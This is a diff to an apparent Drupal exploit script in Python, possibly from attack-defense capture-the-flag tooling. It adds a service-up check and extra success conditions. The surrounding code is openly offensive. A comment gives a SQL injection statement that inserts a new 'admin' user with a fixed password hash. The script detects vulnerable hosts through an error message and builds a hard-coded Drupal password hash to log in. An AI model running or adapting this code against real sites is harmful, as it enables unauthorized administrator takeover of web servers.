@@ -126,6 +126,20 @@ class Drupal:
         url = url + "/?q=node&destination=node"
         return url
 
+    def __check(self):
+        log.debug(f"[!] Checking if Drupal is up... ({self.__host})")
+        try:
+            r = requests.get(f"http://{self.__host}/drupal/")
+            if r.status_code != 200:
+                log.info(f"[!] Drupal is down ({self.__host})")
+                return False
+            if "jQuery.extend(Drupal.settings" not in r.text:
+                log.info(f"[!] Unexpected data from Drupal base page ({self.__host})")
+                return False
+            return True
+        except Exception as e:
+            log.info(f"[!] Exception checking service: {e} ({self.__host})")
+
     def __exploit(self):
         # Add new user:
         # insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'admin', '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' FROM users
@@ -144,6 +158,9 @@ class Drupal:
             )
             if "mb_strlen() expects parameter 1" in r.text:
                 log.info(f"[!] Drupal is vulnerable ({self.__host})")
+                return True
+            if "The website encountered an unexpected error. Please try again later." in r.text:
+                log.info(f"[!] Drupal is down... lol ({self.__host})")
                 return True
             else:
                 log.info(f"[X] Exploit failed for some reason ({self.__host})")
@@ -168,6 +185,9 @@ class Drupal:
             self.__user = username
         if pwd:
             self.__pw = pwd
+        if not self.__check():
+            log.info(f"[!] Unexpected data from Drupal default page ({self.__host})")
+            return True
         self.__target = self.__url()
         self.__hash = DrupalHash(
             "$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", self.__pw
